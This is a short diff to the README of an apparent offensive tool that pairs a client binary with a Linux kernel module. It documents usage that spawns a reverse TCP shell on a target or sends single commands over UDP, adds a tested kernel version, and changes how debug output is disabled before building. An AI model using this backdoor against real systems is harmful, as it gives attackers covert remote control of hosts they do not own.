@@ -27,11 +27,12 @@ Copy the compiled binary to the host system. Run the following commands to inter
 ```sh
 export IFACE=<ethernet_interface> # set interface env var
 sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
-sudo -E ./poetry -t <target_ip> -c <command> # -c sends a single command through udp. no output
+sudo -E ./poetry -t <target_ip> -c "<command>" # -c sends a single command through udp. no output
 ```
 
 ## Kernel Module
 ### Tested On:
+- 5.4.0
 - 5.13.0
 ### Building
 ```sh
@@ -45,7 +46,7 @@ apt install build-essential \
 cd lkm/
 
 # comment out the printk debug statements
-sed -i 's/printk/\/\/printk/g' *.c 
+sed -i 's/debug=1/debug=0/g' poet.c 
 
 # compile the kernel module with the corresponding headers
 make 
